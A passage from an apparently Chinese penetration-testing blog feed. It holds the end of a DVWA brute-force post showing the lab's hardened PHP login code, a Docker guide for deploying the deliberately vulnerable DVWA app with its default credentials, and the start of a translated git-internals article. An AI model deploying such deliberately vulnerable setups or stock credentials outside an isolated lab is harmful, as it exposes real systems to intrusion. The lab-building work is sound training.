Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$user</span> );<br>    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Default values</span><br>    <span class="hljs-variable">$total_failed_login</span> = <span class="hljs-number">3</span>;<br>    <span class="hljs-variable">$lockout_time</span>       = <span class="hljs-number">15</span>;<br>    <span class="hljs-variable">$account_locked</span>     = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// Check the database (Check user information)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// Check to see if the user has been locked out.</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="hljs-variable">$total_failed_login</span> ) )  &#123;<br>        <span class="hljs-comment">// User locked out.  Note, using this method would allow for user enumeration!</span><br>        <span class="hljs-comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><br>        <span class="hljs-comment">// Calculate when the user would be allowed to login again</span><br>        <span class="hljs-variable">$last_login</span> = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ] );<br>        <span class="hljs-variable">$timeout</span>    = <span class="hljs-variable">$last_login</span> + (<span class="hljs-variable">$lockout_time</span> * <span class="hljs-number">60</span>);<br>        <span class="hljs-variable">$timenow</span>    = <span class="hljs-title function_ invoke__">time</span>();<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="hljs-comment">        */</span><br><br>        <span class="hljs-comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$timenow</span> &lt; <span class="hljs-variable">$timeout</span> ) &#123;<br>            <span class="hljs-variable">$account_locked</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Check the database (if username matches the password)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span>);<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// If its a valid login...</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$account_locked</span> == <span class="hljs-literal">false</span> ) ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$avatar</span>       = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;avatar&#x27;</span> ];<br>        <span class="hljs-variable">$failed_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ];<br>        <span class="hljs-variable">$last_login</span>   = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="hljs-subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Had the account been locked out since last login?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$failed_login</span> &gt;= <span class="hljs-variable">$total_failed_login</span> ) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="hljs-subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Reset bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br><br>        <span class="hljs-comment">// Give the user some feedback</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Update bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// Set the last login time</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然现在有验证码，人脸识别，指纹识别等等技术，但是不是所有的地方都会有这些技术！而且这些技术的反面也在发展。所以，密码平常尽量设置复杂一些，也最好不要多个账户共用密码。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA靶场部署</title>
    <link href="/2022/06/02/dvwa-field-build/"/>
    <url>/2022/06/02/dvwa-field-build/</url>
    
    <content type="html"><![CDATA[<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><blockquote><p>Damn Vulnerable Web Application (DVWA)(译注：可以直译为：”该死的”不安全Web应用程序)，是一个编码差的、易受攻击的 PHP/MySQL Web应用程序。 它的主要目的是帮助信息安全专业人员在合法的环境中，练习技能和测试工具，帮助 Web 开发人员更好地了解如何加强 Web 应用程序的安全性，并帮助学生和教师在可控的教学环境中了解和学习 Web 安全技术。</p></blockquote><blockquote><p>DVWA的目的是通过简单明了的界面来练习一些最常见的 Web 漏洞，所练习的漏洞具有不同的难度级别。 请注意，此软件存在提示和无提示的漏洞。 这是特意为止。 我们鼓励您依靠自己的能力尝试并发现尽可能多的安全问题。</p></blockquote><h1 id="安装方式1（编译docker镜像）"><a href="#安装方式1（编译docker镜像）" class="headerlink" title="安装方式1（编译docker镜像）"></a>安装方式1（编译docker镜像）</h1><p><em><strong>注意通过此方式，需要更新docker软件包,或者docker compose命令换成docker-compose命令。并且编译的DVWA版本是最新的版本，当前为2.3版本</strong></em></p><blockquote><p><a href="https://github.com/digininja/DVWA/">https://github.com/digininja/DVWA/</a></p></blockquote><p>It is possible to run DVWA with containers.</p><p>Prerequisites: Docker and Docker Compose.</p><ul><li>If you are using Docker Desktop, both of these should be already installed.</li><li>If you prefer Docker Engine on Linux, make sure to follow their <a href="https://docs.docker.com/engine/install/#server">installation guide</a>.</li></ul><p><strong>We provide support for the latest Docker release as shown above.</strong><br>If you are using Linux and the Docker package that came with your package manager, it will probably work too, but support will only be best-effort.</p><p>Upgrading Docker from the package manager version to upstream requires that you uninstall the old versions as seen in their manuals for <a href="https://docs.docker.com/engine/install/ubuntu/#uninstall-old-versions">Ubuntu</a>, <a href="https://docs.docker.com/engine/install/fedora/#uninstall-old-versions">Fedora</a> and others.<br>Your Docker data (containers, images, volumes, etc.) should not be affected, but in case you do run into a problem, make sure to <a href="https://www.docker.com/support">tell Docker</a> and use search engines in the mean time.</p><p>Then, to get started:</p><ol><li><p>Run <code>docker version</code> and <code>docker compose version</code> to see if you have Docker and Docker Compose properly installed. You should be able to see the version of Docker in the output.</p><p>For example:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;&gt;&gt; docker version<br>Client:<br> [...]<br> Version:           23.0.5<br> [...]<br><br>Server: Docker Desktop 4.19.0 (106363)<br> Engine:<br>  [...]<br>  Version:          23.0.5<br>  [...]<br><br>&gt;&gt;&gt; docker compose version<br>Docker Compose version v2.17.3<br></code></pre></td></tr></table></figure><p>If you don’t see anything or get a command not found error, follow the prerequisites to setup Docker and Docker Compose.</p></li><li><p>Clone or download this repository and extract (see <a href="#download">Download</a>).</p></li><li><p>Open a terminal of your choice and change its working directory to <code>DVWA</code>.</p></li><li><p><code>docker compose up -d</code>.</p></li></ol><p>DVWA is now available at <code>http://localhost:4280</code>.</p><p><strong>Notice that for running DVWA in containers, the web server is listening on port 4280 instead of the usual port of 80.</strong><br>For more information on this decision, see <a href="#i-want-to-run-dvwa-on-a-different-port">I want to run DVWA on a different port</a>.</p><p>需要使用 <code>docker-compose</code>编译镜像，主要用到文件目录下 <code>Dockerfile</code>和 <code>compose.yml</code>文件</p><ul><li>Dockerfile</li></ul><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs docker"><br><br><br><span class="hljs-keyword">FROM</span> docker.io/library/php:<span class="hljs-number">8</span>-apache<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span><br><br><span class="hljs-comment"># https://www.php.net/manual/en/image.installation.php</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update \</span><br><span class="language-bash"> &amp;&amp; apt-get install -y zlib1g-dev libpng-dev libjpeg-dev libfreetype6-dev \</span><br><span class="language-bash"> &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/* \</span><br><span class="language-bash"> &amp;&amp; docker-php-ext-configure gd --with-jpeg --with-freetype \</span><br><span class="language-bash"> <span class="hljs-comment"># Use pdo_sqlite instead of pdo_mysql if you want to use sqlite</span></span><br> &amp;&amp; docker-php-ext-install gd mysqli pdo pdo_mysql<br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=www-data:www-data . .</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=www-data:www-data config/config.inc.php.dist config/config.inc.php</span><br><br></code></pre></td></tr></table></figure><ul><li>compose.yml</li></ul><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs docker">volumes:<br>  dvwa:<br><br><br>networks:<br>  dvwa:<br><br><br>services:<br>  dvwa:<br>    build: .<br>    environment:<br>      - DB_SERVER=db<br>    depends_on:<br>      - db<br>    networks:<br>      - dvwa<br>    ports:<br>      - <span class="hljs-number">4280</span>:<span class="hljs-number">80</span><br>    restart: unless-stopped<br><br>  db:<br>    image: docker.io/library/mariadb:<span class="hljs-number">10</span><br>    environment:<br>      - MYSQL_ROOT_PASSWORD=dvwa<br>      - MYSQL_DATABASE=dvwa<br>      - MYSQL_USER=dvwa<br>      - MYSQL_PASSWORD=p@ssw0rd<br>    volumes:<br>      - dvwa:/var/lib/mysql<br>    networks:<br>      - dvwa<br>    restart: unless-stopped<br><br></code></pre></td></tr></table></figure><ol start="2"><li><code>docker-compose</code>编译完成后会 <code>php</code>,<code>mariadb</code>,<code>dvwa</code>三个镜像,并且执行 <code>docker-compose up -d</code>后php会端口映射在4280端口，可以通过 <code>http://127.0.0.1:4280</code>访问</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker images</span>   <br>REPOSITORY             TAG        IMAGE ID       CREATED       SIZE<br>dvwa-23_dvwa           latest     dab5ed4ddfb9   5 days ago    513MB<br>php                    8-apache   8bb6f2dcced5   12 days ago   503MB<br>mariadb                10         c8b77d250201   5 weeks ago   403MB<br></code></pre></td></tr></table></figure><ol start="3"><li><p>默认账户为 <code>admin:password</code>,最终登录后主页如图所示</p><p><img src="/2022/06/02/dvwa-field-build/1691609465611.png" alt="dvwa首页"></p></li></ol><h1 id="安装方式2（直接拉取镜像）"><a href="#安装方式2（直接拉取镜像）" class="headerlink" title="安装方式2（直接拉取镜像）"></a>安装方式2（直接拉取镜像）</h1><p><em><strong>注意此方式安装的DVW版本和上面的并不一样，以我的为例,dvwa是1.1版本</strong></em></p><ol><li><code>docker pull vulnerables/web-dvwa</code></li><li><code>docker run -d --name dvwa -p 8080:80 vulnerables/webdvwa</code></li><li>访问浏览器 <code>127.0.0.1:8080</code>,默认账户名密码为 <code>admin:password</code><br><img src="/2022/06/02/dvwa-field-build/1692265581869.png" alt="1692265581869"></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在接来的靶场实验中，我们使用上面任意一种都可以，每一关卡的源码几乎一致，有些许差别，不过不影响我们的实验。为了前后一致，我先</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具部署</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git 内部原理图解——对象、分支以及如何从零开始建仓库</title>
    <link href="/2022/06/01/git-object/"/>
    <url>/2022/06/01/git-object/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这篇文章讲的特别好，特别是在git的底层对象中，实际上有四种对象[tree,blob,commit,tag]。在我学习 <code>.git</code>文件泄漏时候棒了大忙，欢迎访问我的<a href="https://gitee.com/lingyuanming/GitHackForPython3">GitHackForPython3</a></p><p>原文链接 <a href="https://www.freecodecamp.org/chinese/news/git-internals-objects-branches-create-repo/">https://www.freecodecamp.org/chinese/news/git-internals-objects-branches-create-repo/</a></p></blockquote><p>我们中的许多人每天都在使用 <code>git</code>，但是有多少人知道它的内部是怎么运作的呢？</p><p>例如我们使用 <code>git commit</code> 时发生了什么？提交（commit）与提交之间保存的是什么？两次提交之间难道只是文件的差异（diff）吗？如果是，这个差异是如何编码的？还是说每次提交都会保存一个当前仓库的完整快照（snapshot）呢？我们使用 <code>git init</code> 时到底发生了什么？</p><p>很多 <code>git</code> 的使用者都不知道这几个问题的答案，但这又有什么关系呢？</p><p>首先，作为专业人员，我们应当努力弄清楚手中使用的工具，尤其是那些我们一直都在使用的——比如 <code>git</code>。</p><p>但是我深刻地意识到，理解 Git 的工作原理在很多情况下都非常有用——不管是解决合并冲突、进行有趣的变基（rebase）操作，还是在某些东西变得有点不对劲的时候。</p><p>如果你有足够的 <code>git</code> 经验，对 <code>git pull</code>、<code>git push</code>、<code>git add</code> 或 <code>git commit</code> 这些命令得心应手，你会从本文中获益。</p><p>不过，为了确保我们在 <code>git</code> 的原理（尤其是本文上下所使用的术语）上步调一致，我们将从概览开始。</p><p>我也在 YouTube 上传了一个涵盖本文所有内容的系列视频——欢迎<a href="https://www.youtube.com/playlist?list=PL9lx0DXCC4BNUby5H58y6s2TQVLadV8v7">在此</a>观看。</p><h1 id="本教程的内容"><a href="#本教程的内容" class="headerlink" title="本教程的内容"></a>本教程的内容</h1><p>我们将对日常使用的 <code>git</code> 的内部运行原理有一个比较深入的理解。</p><p>我们会从对象（object）——<strong>blob</strong>、<strong>树对象（tree）</strong> 和 <strong>提交对象（commit）</strong> 开始，然后简单讨论一下 <strong>分支（branch）</strong> 及其实现方式，之后会深入 <strong>工作目录（working directory）</strong>、<strong>暂存区（staging area）</strong> 和 <strong>仓库（repository）</strong>。</p><p>我们会确保理解了这些术语是与我们用来创建新仓库的那些命令之间是如何关联的。</p><p>接下来，我们会从零开始创建一个仓库——不使用 <code>git init</code>、<code>git add</code> 或 <code>git commit</code>。这会在我们使用 <code>git</code> 的过程中，<strong>加深我们对其内部正在发生的事情的理解</strong>。</p><p>我们也会创建新的分支、在分支间切换，再进行一些提交——全程不使用 <code>git branch</code> 或 <code>git checkout</code>。</p><p>在本文结束之前，**你会觉得自己真的 <em>理解了</em> <code>git</code>**。你准备好了吗？😎</p><blockquote><p>译者注：建议读者配合 <a href="https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-%E5%BA%95%E5%B1%82%E5%91%BD%E4%BB%A4%E4%B8%8E%E4%B8%8A%E5%B1%82%E5%91%BD%E4%BB%A4">Git 内部原理</a>阅读本文。</p></blockquote><h1 id="Git-对象——blob、tree-和-commit"><a href="#Git-对象——blob、tree-和-commit" class="headerlink" title="Git 对象——blob、tree 和 commit"></a>Git 对象——blob、tree 和 commit</h1><blockquote><p>译者注：译文中的 <strong>数据对象</strong>、<strong>树对象</strong> 和 <strong>提交对象</strong> 指的就是 blob、tree 和 commit 这三者。因为 Git 官网的文档<a href="https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-Git-%E5%AF%B9%E8%B1%A1">Git 内部原理 - Git 对象</a>对三者进行了这样的翻译，本文是为了与其保持一致。但由于 blob 一词的特殊性，译文会直接保留原词，而不是将其翻译为“数据对象”。</p></blockquote><p>将 <code>git</code> 看成一个文件系统（尤其是该系统的实时快照）是很有用的。</p><p>一个文件系统从 <em>根目录（root directory）</em> 开始（在基于 UNIX 的系统中是 <code>/</code>），通常也会包含其它的目录（例如 <code>/usr</code> 或 <code>/bin</code>）。这些目录会包含其它的目录和（或）文件（例如 <code>/usr/1.txt</code>）。</p><p>在 <code>git</code> 中，文件的内容存储在一些被称为 <strong>blob</strong> （二进制大对象）的对象中。</p><p><strong>blob</strong> 与文件的不同在于，文件还会包含元数据（meta-data）。例如一个文件会“记住”它的创建时间，如果你把它移动到另一个目录，它的创建时间是不会改变的。</p><p>相反，<strong>blob</strong> 只是内容——数据的二进制流。除了内容以外，<strong>blob</strong> 不会记录它的创建时间、名字或任何其它东西。</p><p><code>git</code> 中的 <strong>blob</strong> 通过 <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1 哈希值</a> 唯一标识。SHA-1 哈希值由 20 个字节（byte）组成，通常表示成 40 个十六进制形式的字符。在这篇文章中，我们有时只会展示这个哈希值的前几个字符。</p><p><img src="https://camo.githubusercontent.com/e0180213af0d75b24faafcea0265b7fa14c90341f4d17044d6f695fc2cda21a1/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d33342e706e67" alt="Blob 有对应的 SHA-1 哈希值"></p><p>在 <code>git</code> 中，<strong>树对象（tree）</strong> 相当于目录。一个 <strong>树对象</strong> 基本上就是一个目录列表，它引用着 <strong>blob</strong> 和其它的 <strong>树对象</strong>。</p><p><strong>树对象</strong> 也用 SHA-1 哈希值唯一标识，它通过其它对象（<strong>blob</strong> 或 <strong>树对象</strong>）的 SHA-1 哈希值引用它们。</p><p><img src="https://camo.githubusercontent.com/cc836ce5be699267deee2d1dfdada0040e4068e24a59b824cad1884ecef78a8a/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d33352e706e67" alt="树对象是一个目录列表"></p><p>注意 <strong>CAFE7</strong> 这个 <strong>树对象</strong> 指向了 <strong>blob F92A0</strong>（_pic.png_），在另一个 <strong>树对象</strong> 中，同一个 <strong>blob</strong> 可能会有不同的名字。</p><p><img src="https://camo.githubusercontent.com/22e34c5f938f535779437e01bbe15ca87ab3ea0addb1650f3c24fa9d856d2d16/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d33362e706e67" alt="树对象可能包含子树对象和其它 blob"></p><p>上面这张图相当于一个文件系统，这个文件系统有一个根目录，根目录下有一个位于 <code>/test.js</code> 的文件和一个名为 <code>/docs</code> 的目录，<code>/docs</code> 目录下有两个文件：<code>/docs/pic.png</code> 和 <code>/docs/1.txt</code>。</p><p>现在是时候捕获该文件系统的一个快照了，把那个时刻存在的所有文件连同它们的内容保存下来。</p><p>在 <code>git</code> 中，一个快照就是一个 <strong>提交（commit）</strong>。一个 <strong>提交</strong> 对象包括一个指向主要 <strong>树对象</strong>（根目录）的指针和一些像 <strong>提交者</strong>、<strong>提交信息</strong> 和 <strong>提交时间</strong> 这样的元数据。</p><p>在大多数情况下，一个 <strong>提交</strong> 还会有一个或多个父 <strong>提交</strong>——之前的快照。当然，<strong>提交</strong> 对象也通过它们的 SHA-1 哈希值唯一标识。这些哈希值就是我们使用 <code>git log</code> 命令时看到的那些哈希值。</p><p><img src="https://camo.githubusercontent.com/293d2604d198c04ee6124c5342ae6225f3614ee24e509b372fcdc25adf1159d5/68747470733a2f2f7777772e66726565636f646563616d702e6f72672f6e6577732f636f6e74656e742f696d616765732f323032302f31322f696d6167652d33372e706e67" alt="提交对象是某个时刻的快照。它引用着树的根节点。由于这是第一次提交，它没有父节点"></p><p>每个 <strong>提交</strong> 都持有 _完整的快照_，并不只是与之前 <strong>提交</strong> 之前的差异。</p><p>那么它是怎么工作的呢？难道它不代表我们每次提交都必须保存很多数据吗？</p><p>让我们来看看改变一个文件的内容会发生什么。我们编辑 <code>1.txt</code>，加一个感叹号——也就是把文件的内容由 <code>HELLO WORLD</code> 变为 <code>HELLO WORLD!</code>。</p><p>这个改变意味着我们会有一个新的 <strong>blob</strong>，它有新的 SHA-1 哈希值。这是有意义的，因为 <code>sha1(&quot;HELLO WORLD&quot;)</code> 与 <code>sha1(&quot;HELLO WORLD!&quot;)</code> 并不相同。</p><p><img 